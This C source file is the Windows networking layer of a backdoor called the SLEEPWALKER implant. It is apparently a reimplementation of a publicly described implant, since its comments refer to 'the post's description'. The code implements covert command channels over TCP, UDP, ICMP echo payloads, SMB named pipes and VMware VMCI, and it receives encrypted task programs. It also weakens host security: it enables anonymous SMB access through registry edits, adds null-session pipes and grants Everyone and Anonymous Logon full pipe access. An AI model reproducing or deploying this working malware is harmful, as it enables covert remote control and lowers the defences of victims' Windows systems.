/*
 * sw_net.c - the Windows networking layer of the SLEEPWALKER implant.
 *
 * Windows-only TU.  Provides the send/receive operations behind the
 * bytecode interpreter's networking opcodes, the VMware VMCI channel,
 * and the host-weakening that makes unauthenticated named-pipe access
 * possible.
 *
 * Transports:
 *   TCP  / UDP            Winsock2 stream / datagram sockets.
 *   ICMP                  IcmpSendEcho (payload hidden inside a ping).
 *   named pipes           CreateNamedPipeW / CreateFileW, SMB-style.
 *   VMCI                  vm:<cid> host field, AF value queried from the
 *                         \\.\VMCI device (VMware VMCI Sockets API).
 *
 * Task-program envelope (TCP/UDP/pipes/VMCI):
 *   stream transports:    [2-byte BE envelope length][AES-256-CCM envelope]
 *   UDP datagram:         the datagram IS the AES-256-CCM envelope
 *   envelope layout:      [12-byte nonce][16-byte tag][ciphertext]
 *
 * The native unit-test build links sw_stub.c instead of this file, so the
 * host never compiles it.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define WIN32_LEAN_AND_MEAN
#define _NO_W32_PSEUDO_MODIFIERS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <accctrl.h>
#include <aclapi.h>

#include "sw_core.h"
#include "sw_impl.h"

/* ------------------------------------------------------------------ */
/* WSA startup (lazy, idempotent)                                      */
/* ------------------------------------------------------------------ */
static volatile LONG g_wsa_started = 0;

static int net_wsa_init(void) {
    if (g_wsa_started) return 0;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;
    InterlockedExchange(&g_wsa_started, 1);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Deadline helper                                                     */
/* ------------------------------------------------------------------ */
static void deadline_init(uint16_t dl, int *has_end, int64_t *end) {
    *has_end = (dl > 0);
    *end = 0;
    if (*has_end) {
        LARGE_INTEGER f, b;
        QueryPerformanceFrequency(&f);
        QueryPerformanceCounter(&b);
        *end = (int64_t)b.QuadPart + (int64_t)dl * (int64_t)f.QuadPart;
    }
}
static int deadline_past(int has_end, int64_t end) {
    if (!has_end) return 0;
    LARGE_INTEGER n;
    QueryPerformanceCounter(&n);
    return n.QuadPart > end;
}

/* ------------------------------------------------------------------ */
/* VMCI                                                                */
/* ------------------------------------------------------------------ */
/* VMCI Sockets driver ioctl (VMware Tools SDK, vmci_sockets.h).       */
#define IOCTL_VMCI_SOCKETS_GET_AF_VALUE 0x12000008

#pragma pack(push, 1)
typedef struct {
    unsigned short svm_family;
    unsigned short svm_reserved1;
    unsigned int   svm_cid;
    unsigned int   svm_port;
    unsigned int   svm_flags;
    unsigned char  svm_zero[8];
} sw_sockaddr_vmci;
#pragma pack(pop)

typedef struct {
    int is_vmci;
    unsigned int cid;
    unsigned int port;
} sw_vmci_target;

/* A host/port pair whose host begins with "vm:" targets the VMware VMCI
 * channel.  The decimal value after the colon is the destination context
 * ID (svm_cid); the separate port string is the VMCI port (svm_port). */
static int vmci_parse(const char *host, const char *port, sw_vmci_target *t) {
    t->is_vmci = 0;
    if (!host || strncmp(host, "vm:", 3) != 0) return 0;
    t->cid = (unsigned int)strtoul(host + 3, NULL, 10);
    t->port = (unsigned int)strtoul(port ? port : "0", NULL, 10);
    t->is_vmci = 1;
    return 1;
}

/* Ask the \\.\VMCI device for the address family to use with socket(). */
static int vmci_af(void) {
    HANDLE h = CreateFileW(L"\\\\.\\VMCI", GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD af = 0, ret = 0;
    BOOL ok = DeviceIoControl(h, IOCTL_VMCI_SOCKETS_GET_AF_VALUE, NULL, 0,
                              &af, sizeof af, &ret, NULL);
    CloseHandle(h);
    return ok ? (int)af : -1;
}

/* Build a socket for a VMCI target and connect it (stream or datagram). */
static SOCKET vmci_connect(const sw_vmci_target *t, int tcp) {
    int af = vmci_af();
    if (af < 0) return INVALID_SOCKET;
    SOCKET s = socket(af, tcp ? SOCK_STREAM : SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    sw_sockaddr_vmci sa;
    memset(&sa, 0, sizeof sa);
    sa.svm_family = (unsigned short)af;
    sa.svm_cid = t->cid;
    sa.svm_port = t->port;
    if (connect(s, (struct sockaddr *)&sa, sizeof sa) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

/* ------------------------------------------------------------------ */
/* Address helpers                                                     */
/* ------------------------------------------------------------------ */
static const char *norm_bind(const char *s) {
    if (s && s[0] == '*' && s[1] == '\0') return "0.0.0.0";
    return s;
}

/* Resolve host:port into a sockaddr_storage. */
static int resolve_addr(const char *host, const char *port,
                        int tcp, struct sockaddr_storage *ss) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = tcp ? SOCK_STREAM : SOCK_DGRAM;
    if (getaddrinfo(host, port, &hints, &res) != 0 || !res) return -1;
    memcpy(ss, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);
    return 0;
}

/* Bind s to la:lp unless both are the "*" wildcard. */
static int bind_local(SOCKET s, const char *la, const char *lp, int tcp) {
    int la_wc = !la || !la[0] || (la[0] == '*' && la[1] == '\0');
    int lp_wc = !lp || !lp[0] || (lp[0] == '*' && lp[1] == '\0');
    if (la_wc && lp_wc) return 0;
    struct sockaddr_storage ss;
    if (resolve_addr(norm_bind(la), norm_bind(lp), tcp, &ss) != 0) return -1;
    return bind(s, (struct sockaddr *)&ss, sizeof ss);
}

/* ------------------------------------------------------------------ */
/* Task envelope decryption                                            */
/* ------------------------------------------------------------------ */
static int decrypt_task(const uint8_t *env, uint32_t env_len,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    if (env_len < 28 || env_len - 28 > cap) return -1;
    uint32_t ct_len = env_len - 28;
    uint8_t check[16];
    if (sw_aes256_ccm_open(env, 12, env + 28, ct_len, task, check, 16) != 0)
        return -1;
    if (memcmp(check, env + 12, 16) != 0) return -1;
    *tlen = ct_len;
    return 0;
}

/* Read n bytes from a socket, honouring the stop flag and deadline. */
static int recv_deadline(SOCKET s, uint8_t *buf, uint32_t n,
                         int has_end, int64_t end) {
    uint32_t got = 0;
    while (got < n) {
        if (sw_stop_flag || deadline_past(has_end, end)) return -1;
        int r = recv(s, (char *)buf + got, n - got, 0);
        if (r > 0) { got += (uint32_t)r; continue; }
        if (r == 0) return -1;
        if (WSAGetLastError() != WSAETIMEDOUT) return -1;
    }
    return 0;
}

/* Receive one length-prefixed task envelope over a byte stream and
 * decrypt it.  Returns 1 on success, 0 on timeout/stop, -1 on error. */
static int recv_envelope_stream(SOCKET s, uint16_t dl,
                                uint8_t *task, uint32_t cap, uint32_t *tlen) {
    DWORD ms = 500;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&ms, sizeof ms);
    int has_end; int64_t end;
    deadline_init(dl, &has_end, &end);
    uint8_t lenb[2];
    if (recv_deadline(s, lenb, 2, has_end, end) != 0) return -1;
    uint32_t env_len = ((uint32_t)lenb[0] << 8) | lenb[1];
    if (env_len < 28 || env_len > 4096) return -1;
    uint8_t env[4096];
    if (recv_deadline(s, env, env_len, has_end, end) != 0) return -1;
    return decrypt_task(env, env_len, task, cap, tlen) == 0 ? 1 : -1;
}

/* ------------------------------------------------------------------ */
/* Sending data                                                        */
/* ------------------------------------------------------------------ */
int sw_tcp_send(const char *la, const char *lp, const char *rh, const char *rp,
                const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)dl;
    if (net_wsa_init() != 0 || !rh || !rp) return -1;
    sw_vmci_target vmci;
    SOCKET s = INVALID_SOCKET;
    if (vmci_parse(rh, rp, &vmci)) {
        s = vmci_connect(&vmci, 1);
    } else {
        struct sockaddr_storage ss;
        if (resolve_addr(rh, rp, 1, &ss) != 0) return -1;
        s = socket(ss.ss_family, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) return -1;
        /* Bind the source address/port before connect or it is ignored. */
        if (bind_local(s, la, lp, 1) != 0) goto fail;
        if (connect(s, (struct sockaddr *)&ss, sizeof ss) != 0) goto fail;
    }
    if (s == INVALID_SOCKET) return -1;
    int sent = (int)send(s, (const char *)blob, blen, 0);
    closesocket(s);
    return (sent == (int)blen) ? 0 : -1;
fail:
    closesocket(s);
    return -1;
}

int sw_udp_send(const char *la, const char *lp, const char *rh, const char *rp,
                const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)dl;
    if (net_wsa_init() != 0 || !rh || !rp) return -1;
    sw_vmci_target vmci;
    SOCKET s = INVALID_SOCKET;
    if (vmci_parse(rh, rp, &vmci)) {
        s = vmci_connect(&vmci, 0);
    } else {
        struct sockaddr_storage ss;
        if (resolve_addr(rh, rp, 0, &ss) != 0) return -1;
        s = socket(ss.ss_family, SOCK_DGRAM, 0);
        if (s == INVALID_SOCKET) return -1;
        /* Bind the source address/port before connect or it is ignored. */
        if (bind_local(s, la, lp, 0) != 0) goto fail;
        if (connect(s, (struct sockaddr *)&ss, sizeof ss) != 0) goto fail;
    }
    if (s == INVALID_SOCKET) return -1;
    int sent = (int)send(s, (const char *)blob, blen, 0);
    closesocket(s);
    return (sent == (int)blen) ? 0 : -1;
fail:
    closesocket(s);
    return -1;
}

int sw_icmp_send(const char *src, const char *dst,
                 const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)src;
    if (net_wsa_init() != 0 || !dst) return -1;
    DWORD addr = inet_addr(dst);
    if (addr == INADDR_NONE) return -1;
    HANDLE h = IcmpCreateFile();
    if (h == INVALID_HANDLE_VALUE) return -1;
    /* IcmpSendEcho requires sizeof(ICMP_ECHO_REPLY) + request size + 8 to
     * accommodate an ICMP error message (TTL-exceeded etc.); otherwise the
     * reply overruns the buffer by 8 bytes. */
    size_t rsz = sizeof(ICMP_ECHO_REPLY) + blen + 8;
    BYTE *reply = (BYTE *)sw_malloc(rsz);
    if (!reply) { IcmpCloseHandle(h); return -1; }
    DWORD rc = IcmpSendEcho(h, addr, (LPVOID)blob, (WORD)blen, NULL,
                            reply, (DWORD)rsz, (DWORD)dl * 1000u);
    int ok = (rc != 0);
    sw_free(reply);
    IcmpCloseHandle(h);
    return ok ? 0 : -1;
}

/* ------------------------------------------------------------------ */
/* Named pipes                                                         */
/* ------------------------------------------------------------------ */
static void build_pipe_path(char *out, size_t cap,
                            const char *server, const char *pipe) {
    if (server && server[0] && strcmp(server, ".") != 0)
        snprintf(out, cap, "\\\\%s\\pipe\\%s", server, pipe);
    else
        snprintf(out, cap, "\\\\.\\pipe\\%s", pipe);
}

int sw_pipe_send(const char *server, const char *pipe,
                 const char *user, const char *pass,
                 const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)dl;
    HANDLE hUser = NULL;
    if (user && user[0]) {
        if (!LogonUserA(user, ".", pass, LOGON32_LOGON_NEW_CREDENTIALS,
                        LOGON32_PROVIDER_DEFAULT, &hUser)) return -1;
        if (!ImpersonateLoggedOnUser(hUser)) { CloseHandle(hUser); return -1; }
    }
    char path[512];
    build_pipe_path(path, sizeof path, server, pipe);
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    int ok = 0;
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        if (WriteFile(h, blob, blen, &written, NULL) && written == blen) ok = 1;
        CloseHandle(h);
    }
    if (hUser) { RevertToSelf(); CloseHandle(hUser); }
    return ok ? 0 : -1;
}

/* Grant Everyone and Anonymous Logon full access to a pipe handle. */
static void set_pipe_dacl(HANDLE h) {
    EXPLICIT_ACCESSA ea[2];
    memset(ea, 0, sizeof ea);
    BuildExplicitAccessWithNameA(&ea[0], "Everyone", GENERIC_ALL,
                                 GRANT_ACCESS, 0);
    BuildExplicitAccessWithNameA(&ea[1], "ANONYMOUS LOGON", GENERIC_ALL,
                                 GRANT_ACCESS, 0);
    PACL acl = NULL;
    if (SetEntriesInAclA(2, ea, NULL, &acl) == ERROR_SUCCESS) {
        SetSecurityInfo(h, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                        NULL, NULL, acl, NULL);
        LocalFree(acl);
    }
}

/* Read one length-prefixed task envelope from a pipe and decrypt it. */
static int read_pipe_envelope(HANDLE h, uint16_t dl,
                              uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)dl;
    uint8_t lenb[2];
    DWORD got = 0;
    if (!ReadFile(h, lenb, 2, &got, NULL) || got != 2) return -1;
    uint32_t env_len = ((uint32_t)lenb[0] << 8) | lenb[1];
    if (env_len < 28 || env_len > 4096) return -1;
    uint8_t *env = (uint8_t *)sw_malloc(env_len);
    if (!env) return -1;
    DWORD total = 0;
    while (total < env_len) {
        DWORD r = 0;
        if (!ReadFile(h, env + total, env_len - total, &r, NULL) || r == 0)
            break;
        total += r;
    }
    int rc = (total == env_len) ? decrypt_task(env, env_len, task, cap, tlen)
                                : -1;
    sw_free(env);
    return rc;
}

int sw_pipe_client_recv(const char *server, const char *pipe,
                        const char *user, const char *pass, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    HANDLE hUser = NULL;
    if (user && user[0]) {
        if (!LogonUserA(user, ".", pass, LOGON32_LOGON_NEW_CREDENTIALS,
                        LOGON32_PROVIDER_DEFAULT, &hUser)) return -1;
        if (!ImpersonateLoggedOnUser(hUser)) { CloseHandle(hUser); return -1; }
    }
    char path[512];
    build_pipe_path(path, sizeof path, server, pipe);
    int has_end; int64_t end;
    deadline_init(dl, &has_end, &end);
    int rc = -1;
    for (;;) {
        if (sw_stop_flag) break;
        if (deadline_past(has_end, end)) break;
        HANDLE h = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            rc = read_pipe_envelope(h, dl, task, cap, tlen);
            CloseHandle(h);
            if (rc == 0) { rc = 1; break; }
        } else {
            /* Pause between attempts (also when a deadline is set) so a
             * missing pipe does not peg a CPU core for the whole window. */
            Sleep(500);
        }
    }
    if (hUser) { RevertToSelf(); CloseHandle(hUser); }
    return rc;
}

/* ------------------------------------------------------------------ */
/* Inbound task reception over TCP / UDP                               */
/* ------------------------------------------------------------------ */
int sw_tcp_connect_recv(const char *la, const char *lp,
                        const char *rh, const char *rp, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    if (net_wsa_init() != 0 || !rh || !rp) return -1;
    sw_vmci_target vmci;
    SOCKET s = INVALID_SOCKET;
    if (vmci_parse(rh, rp, &vmci)) {
        s = vmci_connect(&vmci, 1);
    } else {
        struct sockaddr_storage ss;
        if (resolve_addr(rh, rp, 1, &ss) != 0) return -1;
        s = socket(ss.ss_family, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) return -1;
        /* Honor the requested source address/port (bind before connect). */
        if (bind_local(s, la, lp, 1) != 0) goto fail;
        if (connect(s, (struct sockaddr *)&ss, sizeof ss) != 0) goto fail;
    }
    if (s == INVALID_SOCKET) return -1;
    int rc = recv_envelope_stream(s, dl, task, cap, tlen);
    closesocket(s);
    return rc;
fail:
    closesocket(s);
    return -1;
}

int sw_tcp_listen_recv(const char *a, const char *b, uint16_t dl,
                       uint8_t *task, uint32_t cap, uint32_t *tlen) {
    if (net_wsa_init() != 0) return -1;
    struct sockaddr_storage ss;
    if (resolve_addr(norm_bind(a), norm_bind(b), 1, &ss) != 0) return -1;
    SOCKET ls = socket(ss.ss_family, SOCK_STREAM, 0);
    if (ls == INVALID_SOCKET) return -1;
    if (bind(ls, (struct sockaddr *)&ss, sizeof ss) != 0) goto fail;
    if (listen(ls, 1) != 0) goto fail;
    DWORD ms = 500;
    setsockopt(ls, SOL_SOCKET, SO_RCVTIMEO, (const char *)&ms, sizeof ms);
    int has_end; int64_t end;
    deadline_init(dl, &has_end, &end);
    int rc = 0;
    for (;;) {
        if (sw_stop_flag) break;
        if (deadline_past(has_end, end)) break;
        SOCKET c = accept(ls, NULL, NULL);
        if (c != INVALID_SOCKET) {
            rc = recv_envelope_stream(c, dl, task, cap, tlen);
            closesocket(c);
            break;
        }
        if (WSAGetLastError() != WSAETIMEDOUT) break;
    }
    closesocket(ls);
    return rc;
fail:
    closesocket(ls);
    return -1;
}

int sw_udp_bind_recv(const char *a, const char *b, uint16_t dl,
                     uint8_t *task, uint32_t cap, uint32_t *tlen) {
    if (net_wsa_init() != 0) return -1;
    struct sockaddr_storage ss;
    if (resolve_addr(norm_bind(a), norm_bind(b), 0, &ss) != 0) return -1;
    SOCKET s = socket(ss.ss_family, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET) return -1;
    if (bind(s, (struct sockaddr *)&ss, sizeof ss) != 0) { closesocket(s); return -1; }
    DWORD ms = 500;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&ms, sizeof ms);
    int has_end; int64_t end;
    deadline_init(dl, &has_end, &end);
    uint8_t env[4096];
    int rc = 0;
    for (;;) {
        if (sw_stop_flag) break;
        if (deadline_past(has_end, end)) break;
        int n = (int)recv(s, (char *)env, sizeof env, 0);
        if (n < 0) {
            if (WSAGetLastError() == WSAETIMEDOUT) continue;
            break;
        }
        if (decrypt_task(env, (uint32_t)n, task, cap, tlen) == 0) {
            rc = 1;
            break;
        }
    }
    closesocket(s);
    return rc;
}

/* ------------------------------------------------------------------ */
/* Host weakening (unauthenticated named-pipe access)                  */
/* ------------------------------------------------------------------ */
static void set_reg_dword(HKEY root, const char *sub,
                          const char *name, DWORD value) {
    HKEY k = NULL;
    if (RegOpenKeyExA(root, sub, 0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return;
    RegSetValueExA(k, name, 0, REG_DWORD, (const BYTE *)&value, sizeof value);
    RegCloseKey(k);
}

/* Bookkeeping for the cleanup path.  Faithful to the post's description:
 * the code records whether adding the NullSessionPipes entry succeeded,
 * not whether the entry already existed - so cleanup can remove an entry
 * that was present before the backdoor ran. */
static char g_null_pipe[64] = {0};
static int  g_null_added_ok = 0;

static void add_null_session_pipe(const char *pipe) {
    const char *sub = "SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters";
    HKEY k = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, sub, 0,
                      KEY_READ | KEY_WRITE, &k) != ERROR_SUCCESS) return;
    DWORD type = 0, sz = 0;
    char *cur = NULL;
    if (RegQueryValueExA(k, "NullSessionPipes", NULL, &type, NULL, &sz)
            == ERROR_SUCCESS && sz > 0) {
        cur = (char *)sw_malloc(sz);
        if (cur) RegQueryValueExA(k, "NullSessionPipes", NULL, &type,
                                  (BYTE *)cur, &sz);
    }
    size_t total = 0;
    int found = 0;
    if (cur && sz > 0) {
        char *p = cur;
        char *e = cur + sz;
        while (p < e && *p) {
            size_t l = strlen(p);
            if (strcmp(p, pipe) == 0) found = 1;
            total += l + 1;
            p += l + 1;
        }
    }
    if (found) {
        sw_free(cur);
        RegCloseKey(k);
        return;
    }
    size_t need = total + strlen(pipe) + 2;
    char *nxt = (char *)sw_calloc(1, need);
    if (nxt) {
        size_t o = 0;
        if (cur && sz > 0) {
            char *p = cur;
            char *e = cur + sz;
            while (p < e && *p) {
                size_t l = strlen(p);
                memcpy(nxt + o, p, l + 1);
                o += l + 1;
                p += l + 1;
            }
        }
        size_t pl = strlen(pipe);
        memcpy(nxt + o, pipe, pl);
        o += pl;
        nxt[o] = '\0';
        if (RegSetValueExA(k, "NullSessionPipes", 0, REG_MULTI_SZ,
                           (BYTE *)nxt, (DWORD)(o + 1)) == ERROR_SUCCESS) {
            /* Records that the write succeeded - NOT whether the entry
             * pre-existed (the post's described bookkeeping flaw). */
            g_null_added_ok = 1;
            snprintf(g_null_pipe, sizeof g_null_pipe, "%s", pipe);
        }
        sw_free(nxt);
    }
    sw_free(cur);
    RegCloseKey(k);
}

static volatile LONG g_anon_enabled = 0;
static DWORD g_anon_prev = 0;

static void enable_anonymous_smb(void) {
    if (InterlockedCompareExchange(&g_anon_enabled, 1, 0)) return;
    /* Save the prior value so cleanup can restore it. */
    HKEY k = NULL;
    DWORD type = 0, sz = sizeof g_anon_prev;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\Lsa",
                      0, KEY_QUERY_VALUE, &k) == ERROR_SUCCESS) {
        RegQueryValueExA(k, "EveryoneIncludesAnonymous", NULL, &type,
                         (BYTE *)&g_anon_prev, &sz);
        RegCloseKey(k);
    }
    set_reg_dword(HKEY_LOCAL_MACHINE,
                  "SYSTEM\\CurrentControlSet\\Control\\Lsa",
                  "EveryoneIncludesAnonymous", 1);
}

static void remove_null_session_pipe(void);
void sw_namedpipe_cleanup(void);

/* Undo the host weakening.  Invoked on shutdown.  The bookkeeping records
 * only that the NullSessionPipes write succeeded (g_null_added_ok), not
 * whether the entry pre-existed, so a pre-existing entry can be removed -
 * the weakness the post describes. */
void sw_namedpipe_cleanup(void) {
    if (g_anon_enabled) {
        set_reg_dword(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\Lsa",
                      "EveryoneIncludesAnonymous", g_anon_prev);
    }
    if (g_null_added_ok) remove_null_session_pipe();
    g_anon_enabled = 0;
    g_null_added_ok = 0;
    g_null_pipe[0] = '\0';
}

static void remove_null_session_pipe(void) {
    if (!g_null_pipe[0]) return;
    const char *sub = "SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters";
    HKEY k = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, sub, 0,
                      KEY_READ | KEY_WRITE, &k) != ERROR_SUCCESS) return;
    DWORD sz = 0;
    char *cur = NULL;
    if (RegQueryValueExA(k, "NullSessionPipes", NULL, NULL, NULL, &sz)
            == ERROR_SUCCESS && sz > 0) {
        cur = (char *)sw_malloc(sz);
        if (cur) RegQueryValueExA(k, "NullSessionPipes", NULL, NULL,
                                  (BYTE *)cur, &sz);
    }
    size_t outsz = 0;
    if (cur && sz > 0) {
        char *p = cur;
        char *e = cur + sz;
        while (p < e && *p) {
            size_t l = strlen(p);
            if (strcmp(p, g_null_pipe) != 0) outsz += l + 1;
            p += l + 1;
        }
    }
    if (outsz == 0) {
        RegDeleteValueA(k, "NullSessionPipes");
    } else {
        char *nxt = (char *)sw_calloc(1, outsz + 1);
        if (nxt) {
            size_t o = 0;
            char *p = cur;
            char *e = cur + sz;
            while (p < e && *p) {
                size_t l = strlen(p);
                if (strcmp(p, g_null_pipe) != 0) {
                    memcpy(nxt + o, p, l + 1);
                    o += l + 1;
                }
                p += l + 1;
            }
            nxt[o] = '\0';
            RegSetValueExA(k, "NullSessionPipes", 0, REG_MULTI_SZ,
                           (BYTE *)nxt, (DWORD)(o + 1));
            sw_free(nxt);
        }
    }
    sw_free(cur);
    RegCloseKey(k);
}

int sw_pipe_server_recv(const char *pipe, const char *reserved, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)reserved;
    if (!pipe || !pipe[0]) return -1;
    enable_anonymous_smb();
    add_null_session_pipe(pipe);
    char name[256];
    snprintf(name, sizeof name, "\\\\.\\pipe\\%s", pipe);
    HANDLE h = CreateNamedPipeA(name, PIPE_ACCESS_INBOUND,
                                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                1, 0, 4096, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    set_pipe_dacl(h);
    int has_end; int64_t end;
    deadline_init(dl, &has_end, &end);
    int rc = 0;
    for (;;) {
        if (sw_stop_flag) break;
        if (deadline_past(has_end, end)) break;
        if (ConnectNamedPipe(h, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            if (read_pipe_envelope(h, dl, task, cap, tlen) == 0) rc = 1;
            DisconnectNamedPipe(h);
            if (rc == 1) break;
        } else {
            Sleep(500);
        }
    }
    CloseHandle(h);
    return rc;
}
